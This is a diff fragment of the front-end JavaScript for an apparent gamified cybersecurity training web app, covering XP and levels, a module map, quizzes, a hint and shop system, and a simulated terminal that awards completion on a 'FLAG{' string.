+            let xpNeeded = Math.floor(100 * Math.pow(1.5, state.level - 1));
+
+            if (state.xp >= xpNeeded) {
+                state.xp -= xpNeeded;
+                state.level++;
+                xpNeeded = Math.floor(100 * Math.pow(1.5, state.level - 1));
+                showToast(`LEVEL UP! You are now Level ${state.level}`, 'success');
+            }
+
+            document.getElementById('player-level').innerText = state.level;
+            document.getElementById('xp-text').innerText = `${Math.floor(state.xp)} / ${xpNeeded}`;
+            document.getElementById('player-credits').innerText = state.credits;
+            document.getElementById('shop-balance').innerText = state.credits;
+
+            let percent = (state.xp / xpNeeded) * 100;
+            document.getElementById('xp-bar').style.width = `${percent}%`;
+            document.getElementById('xp-fill').style.height = `${percent}%`;
+
+            let titleIndex = Math.min(Math.floor((state.level - 1) / 2), titles.length - 1);
+            document.getElementById('player-title').innerText = titles[titleIndex];
+        }
+
+        function addXP(amount, applyMultiplier = true) {
+            let finalXP = applyMultiplier ? Math.floor(amount * state.activeBuffs.xpMultiplier) : amount;
+            state.xp += finalXP;
+            updateStatsUI();
+            return finalXP;
+        }
+
+        function earnCredits(amount) {
+            let finalCredits = Math.floor(amount * state.activeBuffs.creditMultiplier) + state.activeBuffs.flatCreditBonus;
+            state.credits += finalCredits;
+            updateStatsUI();
+            return finalCredits;
+        }
+
+        function renderMap() {
+            const container = document.getElementById('map-container');
+            if(!container) return;
+
+            const searchEl = document.getElementById('map-search');
+            const q = (searchEl ? searchEl.value : '').trim().toLowerCase();
+
+            container.innerHTML = '';
+
+            const line = document.createElement('div');
+            line.className = 'path-line top-0 bottom-0';
+            container.appendChild(line);
+
+            const visible = allNodes.filter(function(node) {
+                if (node.requiresProxy && !state.activeBuffs.bypassFirewall) return false;
+                if (!q) return true;
+                const haystack = (node.title + ' ' + (node.chapter || '') + ' ' + (node.desc || '')).toLowerCase();
+                return haystack.includes(q);
+            });
+
+            const progEl = document.getElementById('map-progress');
+            if (progEl) {
+                progEl.innerText = `${state.completedNodes.length} / ${allNodes.length} MODULES CLEARED`;
+            }
+
+            if (visible.length === 0) {
+                const empty = document.createElement('div');
+                empty.className = 'relative z-10 text-term-light opacity-60 italic py-12 text-center';
+                empty.innerText = 'No modules match that query.';
+                container.appendChild(empty);
+                return;
+            }
+
+            let lastChapter = null;
+
+            visible.forEach(function(node, index) {
+                if (node.chapter && node.chapter !== lastChapter) {
+                    lastChapter = node.chapter;
+                    const hdr = document.createElement('div');
+                    hdr.className = 'relative z-10 w-full max-w-2xl text-center mt-8 mb-2';
+                    hdr.innerHTML = `<span class="inline-block px-5 py-2 bg-term-black border border-term-cyan/50 text-term-cyan text-[10px] uppercase tracking-[0.25em] rounded-full">${node.chapter}</span>`;
+                    container.appendChild(hdr);
+                }
+
+                const isUnlocked = state.unlockedNodes.includes(node.id);
+                const isCompleted = state.completedNodes.includes(node.id);
+
+                const nodeEl = document.createElement('div');
+                nodeEl.className = `relative z-10 w-full max-w-md bg-term-dark border-2 p-6 rounded-lg transition-all duration-300 ${isUnlocked ? 'border-term-green hover:shadow-neon-green cursor-pointer' : 'border-term-gray opacity-50 cursor-not-allowed'} ${isCompleted ? 'bg-term-green/10' : ''}`;
+
+                const dot = document.createElement('div');
+                dot.className = `absolute top-1/2 -translate-y-1/2 w-6 h-6 rounded-full border-4 border-term-black ${index % 2 === 0 ? '-right-3' : '-left-3'} ${isCompleted ? 'bg-term-green' : (isUnlocked ? 'bg-yellow-500' : 'bg-term-gray')}`;
+                nodeEl.appendChild(dot);
+
+                if(index % 2 !== 0) nodeEl.classList.add('self-end');
+                else nodeEl.classList.add('self-start');
+
+                nodeEl.innerHTML += `
+                    <div class="flex items-center gap-4">
+                        <div class="w-12 h-12 rounded bg-term-black border ${isUnlocked ? 'border-term-cyan text-term-cyan' : 'border-term-gray text-term-gray'} flex items-center justify-center text-xl shrink-0">
+                            <i class="fas ${node.icon}"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-bold ${isUnlocked ? 'text-term-light' : 'text-term-gray'} text-lg">${node.title}</h3>
+                            <p class="text-xs ${isUnlocked ? 'text-term-green' : 'text-term-gray'} uppercase font-sans mt-1">[${node.type}] ${isCompleted ? '- DONE' : ''}</p>
+                        </div>
+                    </div>
+                    <p class="mt-4 text-sm font-sans ${isUnlocked ? 'text-term-light/80' : 'text-term-gray'}">${node.desc}</p>
+                    ${isUnlocked && !isCompleted ? `<div class="mt-4 text-xs text-yellow-500"><i class="fas fa-coins mr-1"></i>${node.rewards.credits} | <i class="fas fa-star mr-1"></i>${node.rewards.xp}</div>` : ''}
+                `;
+
+                if(isUnlocked) {
+                    nodeEl.onclick = () => startModule(node.id);
+                }
+
+                container.appendChild(nodeEl);
+            });
+
+            const infiniteNode = document.createElement('div');
+            infiniteNode.className = 'relative z-10 w-full max-w-md bg-term-black border border-term-gray border-dashed p-6 rounded-lg opacity-50 mt-8 text-center';
+            infiniteNode.innerHTML = `
+                <i class="fas fa-database text-3xl text-term-gray mb-3"></i>
+                <h3 class="font-bold text-term-gray text-lg">Connect to Mainframe Database</h3>
+                <p class="text-sm font-sans text-term-gray mt-2">${CURRICULUM.length} extended modules are loaded. A production deployment would stream thousands more directly from the database.</p>
+            `;
+            container.appendChild(infiniteNode);
+        }
+
+        function startModule(id) {
+            const node = getNode(id);
+            if(!node) return;
+            currentActiveModule = node;
+
+            if(node.type === 'terminal') {
+                setupTerminal(node);
+                switchView('terminal');
+            } else {
+                setupLesson(node);
+                switchView('lesson');
+            }
+        }
+
+        function setupLesson(node) {
+            document.getElementById('lesson-title').innerText = node.title;
+            document.getElementById('lesson-type').innerText = `MODULE // ${node.type.toUpperCase()}${node.chapter ? ' // ' + node.chapter : ''}`;
+            document.getElementById('lesson-icon').innerHTML = `<i class="fas ${node.icon}"></i>`;
+            document.getElementById('lesson-content').innerHTML = node.content;
+            document.getElementById('lesson-question').innerText = node.question;
+
+            const optionsContainer = document.getElementById('quiz-options');
+            const inputArea = document.getElementById('text-input-area');
+            const hintDisplay = document.getElementById('hint-display');
+
+            optionsContainer.classList.add('hidden');
+            inputArea.classList.add('hidden');
+            hintDisplay.classList.add('hidden');
+            hintDisplay.innerText = node.hint;
+
+            const hintCost = state.activeBuffs.hintDiscount ? 5 : 10;
+            document.getElementById('btn-hint').innerHTML = state.activeBuffs.freeHints > 0 ? 
+                `<i class="fas fa-lightbulb"></i> Request Hint (Free: ${state.activeBuffs.freeHints} left)` : 
+                `<i class="fas fa-lightbulb"></i> Request Hint (Cost: ${hintCost} Credits)`;
+
+            if(node.type === 'quiz') {
+                optionsContainer.classList.remove('hidden');
+                optionsContainer.innerHTML = '';
+                node.options.forEach((opt, idx) => {
+                    const btn = document.createElement('button');
+                    btn.className = 'w-full text-left p-4 rounded border border-term-gray bg-term-black hover:border-term-cyan hover:bg-term-cyan/10 transition-all font-sans text-term-light';
+                    btn.innerText = opt;
+                    btn.onclick = () => handleQuizAnswer(idx);
+                    optionsContainer.appendChild(btn);
+                });
+            } else if (node.type === 'input') {
+                inputArea.classList.remove('hidden');
+                const inp = document.getElementById('lesson-text-input');
+                inp.value = '';
+                document.getElementById('submit-text-btn').onclick = () => handleInputAnswer(inp.value);
+            }
+        }
+
+        function handleQuizAnswer(selectedIndex) {
+            if(selectedIndex === currentActiveModule.answer) {
+                completeModule();
+            } else {
+                showToast('Incorrect. The system rejected your answer.', 'error');
+            }
+        }
+
+        function handleInputAnswer(val) {
+            if(val.trim() === currentActiveModule.exactAnswer) {
+                completeModule();
+            } else {
+                showToast('Payload failed. Target system secured.', 'error');
+            }
+        }
+
+        document.getElementById('btn-hint').onclick = () => {
+            const hintDisplay = document.getElementById('hint-display');
+            if(!hintDisplay.classList.contains('hidden')) return; 
+
+            const hintCost = state.activeBuffs.hintDiscount ? 5 : 10;
+
+            if(state.activeBuffs.freeHints > 0) {
+                state.activeBuffs.freeHints--;
+                hintDisplay.classList.remove('hidden');
+                showToast('Hint unlocked.', 'success');
+                renderBuffs();
+                setupLesson(currentActiveModule);
+            } else if (state.credits >= hintCost) {
+                state.credits -= hintCost;
+                updateStatsUI();
+                hintDisplay.classList.remove('hidden');
+                showToast('Hint purchased.', 'success');
+            } else {
+                showToast(`Insufficient credits. Need ${hintCost}.`, 'error');
+            }
+        };
+
+        function completeModule() {
+            if(!state.completedNodes.includes(currentActiveModule.id)) {
+                state.completedNodes.push(currentActiveModule.id);
+                
+                const earnedXP = addXP(currentActiveModule.rewards.xp);
+                const earnedCredits = earnCredits(currentActiveModule.rewards.credits);
+
+                if(currentActiveModule.unlocks) {
+                    currentActiveModule.unlocks.forEach(u => {
+                        if(!state.unlockedNodes.includes(u)) state.unlockedNodes.push(u);
+                    });
+                }
+                showToast(`Module Complete! +${earnedXP} XP, +${earnedCredits} Credits`, 'success');
+            } else {
+                showToast('Module replayed. (No rewards granted)', 'info');
+            }
+            switchView('map');
+        }
+
+        function setupTerminal(node) {
+            document.getElementById('terminal-title').innerText = `ssh ${node.id}@target.local`;
+
+            const objList = document.getElementById('terminal-objective-list');
+            objList.innerHTML = '';
+            if(node.objectives) {
+                node.objectives.forEach(obj => {
+                    objList.innerHTML += `<li class="flex items-start gap-2"><i class="fas fa-angle-right text-term-cyan mt-1"></i> <span>${obj}</span></li>`;
+                });
+            }
+
+            const cheatSheet = document.getElementById('terminal-cheatsheet');
+            cheatSheet.innerHTML = '';
+            if(node.cheatsheet) {
+                node.cheatsheet.forEach(item => {
+                    cheatSheet.innerHTML += `
+                        <div class="bg-term-black border border-term-gray p-2 rounded">
+                            <span class="text-term-green font-bold block mb-1">${item.cmd}</span>
+                            <span class="text-term-light/70 text-xs">${item.desc}</span>
+                        </div>
+                    `;
+                });
+            }
+
+            const out = document.getElementById('terminal-output');
+            out.innerHTML = `<div class="text-term-green">root@cyberquest:~# Establishing secure connection...</div>
+                             <div class="text-term-green">root@cyberquest:~# Connected.</div>
+                             <div class="text-term-light opacity-70 mt-4 bg-term-gray/20 p-3 border-l-2 border-term-cyan font-sans">${node.terminalSetup}</div>
+                             <div class="text-term-light opacity-50 mt-4 mb-2">System initialized. Awaiting input...</div>`;
+
+            currentTerminalInstance = {
+                node: node,
+                logic: node.terminalLogic.bind({ completed: false, lsDone: false }),
+                history: [],
+                historyIndex: -1
+            };
+
+            const inp = document.getElementById('terminal-input');
+            inp.value = '';
+            inp.focus();
+        }
+
+        document.getElementById('terminal-input').addEventListener('keydown', function(e) {
+            if(e.key === 'Enter') {
+                const cmd = this.value;
+                if(!cmd.trim()) return;
+
+                this.value = '';
+                printToTerminal(`guest@target:~$ ${cmd}`, 'text-term-light font-bold');
+
+                if(cmd.trim().toLowerCase() === 'clear') {
+                    document.getElementById('terminal-output').innerHTML = '';
+                    return;
+                }
+
+                currentTerminalInstance.history.push(cmd);
+                currentTerminalInstance.historyIndex = currentTerminalInstance.history.length;
+
+                const response = currentTerminalInstance.logic(cmd);
+                if(response) printToTerminal(response, 'text-term-light');
+
+                if(response && response.includes('FLAG{')) {
+                    setTimeout(() => {
+                        completeModule();
+                    }, 2500);
+                    printToTerminal("SYSTEM: Objective complete. Disconnecting in 2 seconds...", "text-term-cyan mt-4");
+                }
+
+                const out = document.getElementById('terminal-output');
+                out.scrollTop = out.scrollHeight;
+            } else if (e.key === 'ArrowUp') {
+                if(currentTerminalInstance.historyIndex > 0) {
+                    currentTerminalInstance.historyIndex--;
+                    this.value = currentTerminalInstance.history[currentTerminalInstance.historyIndex];
+                }
+                e.preventDefault();
+            } else if (e.key === 'ArrowDown') {
+                if(currentTerminalInstance.historyIndex < currentTerminalInstance.history.length - 1) {
+                    currentTerminalInstance.historyIndex++;
+                    this.value = currentTerminalInstance.history[currentTerminalInstance.historyIndex];
+                } else {
+                    currentTerminalInstance.historyIndex = currentTerminalInstance.history.length;
+                    this.value = '';
+                }
+                e.preventDefault();
+            }
+        });
+
+        document.getElementById('view-terminal').addEventListener('click', () => {
+            document.getElementById('terminal-input').focus();
+        });
+
+        function printToTerminal(text, classes = '') {
+            const out = document.getElementById('terminal-output');
+            const div = document.createElement('div');
+            div.className = classes;
+            div.innerHTML = text;
+            out.appendChild(div);
+        }
+
+        function renderShop() {
+            const container = document.getElementById('shop-items');
+            container.innerHTML = '';
+
+            shopData.forEach(item => {
+                const isOwned = state.inventory.includes(item.id) && item.type === 'passive';
+                const canAfford = state.credits >= item.cost;
+
+                const el = document.createElement('div');
+                el.className = `bg-term-dark border ${isOwned ? 'border-term-gray opacity-50' : 'border-term-gray hover:border-term-cyan transition-colors'} p-6 rounded flex flex-col`;
+                el.innerHTML = `
+                    <div class="flex items-center gap-4 mb-4">
+                        <div class="w-12 h-12 rounded bg-term-black border border-term-gray flex items-center justify-center text-xl shrink-0 ${item.color}">
+                            <i class="fas ${item.icon}"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-bold text-term-light">${item.name}</h3>
+                            <p class="text-xs text-term-cyan font-sans uppercase">${item.type}</p>
+                        </div>
+                    </div>
+                    <p class="text-sm font-sans text-term-light/80 mb-6 flex-1">${item.desc}</p>
+                    <button class="w-full py-2 rounded font-bold transition-colors ${isOwned ? 'bg-term-gray text-term-light cursor-not-allowed' : (canAfford ? 'bg-term-green text-term-black hover:bg-term-cyan' : 'bg-term-red/20 text-term-red cursor-not-allowed')}" ${isOwned || !canAfford ? 'disabled' : ''} id="btn-buy-${item.id}">
+                        ${isOwned ? 'OWNED' : `<i class="fas fa-coins mr-2"></i>${item.cost}`}
+                    </button>
+                `;
+                container.appendChild(el);
+
+                if(!isOwned && canAfford) {
+                    document.getElementById(`btn-buy-${item.id}`).onclick = () => buyItem(item.id);
+                }
+            });
+        }
+
+        function buyItem(id) {
+            const item = shopData.find(i => i.id === id);
+            if(state.credits >= item.cost) {
+                state.credits -= item.cost;
+                if(item.type === 'passive') {
+                    state.inventory.push(id);
+                }
+                item.effect();
+                updateStatsUI();
+                renderShop();
+                showToast(`Acquired: ${item.name}`, 'success');
+            }
+        }
+
+        function renderInventory() {
+            const container = document.getElementById('inventory-items');
+            container.innerHTML = '';
+
+            if(state.inventory.length === 0) {
+                container.innerHTML = '<div class="text-term-light opacity-50 italic">Inventory is empty. Visit the market.</div>';
+                return;
+            }
+
+            state.inventory.forEach(id => {
+                const item = shopData.find(i => i.id === id);
+                container.innerHTML += `
+                    <div class="bg-term-dark border border-term-green p-4 rounded flex items-center gap-4">
+                        <div class="w-10 h-10 rounded bg-term-black flex items-center justify-center text-lg ${item.color}">
+                            <i class="fas ${item.icon}"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-bold text-term-light">${item.name}</h3>
+                            <p class="text-xs font-sans text-term-light/70">${item.desc}</p>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function renderBuffs() {
+            const container = document.getElementById('buff-container');
+            container.innerHTML = '';
+
+            if(state.activeBuffs.xpMultiplier > 1.0) {
+                container.innerHTML += `<span class="px-2 py-1 bg-purple-900/50 text-purple-400 border border-purple-500 rounded text-xs font-sans"><i class="fas fa-microchip mr-1"></i>XP +${Math.round((state.activeBuffs.xpMultiplier - 1)*100)}%</span>`;
+            }
+            if(state.activeBuffs.creditMultiplier > 1.0) {
+                container.innerHTML += `<span class="px-2 py-1 bg-yellow-900/50 text-yellow-400 border border-yellow-500 rounded text-xs font-sans"><i class="fas fa-coins mr-1"></i>Credits +${Math.round((state.activeBuffs.creditMultiplier - 1)*100)}%</span>`;
+            }
+            if(state.activeBuffs.freeHints > 0) {
+                container.innerHTML += `<span class="px-2 py-1 bg-yellow-900/50 text-yellow-400 border border-yellow-500 rounded text-xs font-sans"><i class="fas fa-key mr-1"></i>Hints: ${state.activeBuffs.freeHints}</span>`;
+            }
+            if(state.activeBuffs.hintDiscount) {
+                container.innerHTML += `<span class="px-2 py-1 bg-pink-900/50 text-pink-400 border border-pink-500 rounded text-xs font-sans"><i class="fas fa-tag mr-1"></i>Cheap Hints</span>`;
+            }
+            if(state.activeBuffs.bypassFirewall) {
+                container.innerHTML += `<span class="px-2 py-1 bg-term-cyan/20 text-term-cyan border border-term-cyan rounded text-xs font-sans"><i class="fas fa-network-wired mr-1"></i>Proxy Chain</span>`;
+            }
+            if(state.activeBuffs.flatCreditBonus > 0) {
+                container.innerHTML += `<span class="px-2 py-1 bg-gray-700/50 text-gray-300 border border-gray-400 rounded text-xs font-sans"><i class="fas fa-plus mr-1"></i>${state.activeBuffs.flatCreditBonus} Cr/Mod</span>`;
+            }
+        }
+
+        function checkHiddenNodes() {
+            if(state.activeBuffs.bypassFirewall && !state.unlockedNodes.includes(7)) {
+                state.unlockedNodes.push(7);
+                showToast("CRITICAL: Hidden network path discovered.", "info");
+            }
+        }
+
+        window.onload = () => {
+            updateStatsUI();
+            switchView('map');
+
+            setInterval(() => {
+                const title = document.querySelector('h1');
+                title.classList.add('glitch-hover');
+                setTimeout(() => title.classList.remove('glitch-hover'), 200);
+            }, 5000);
+        };
+    </script>
+</body>
+</html>
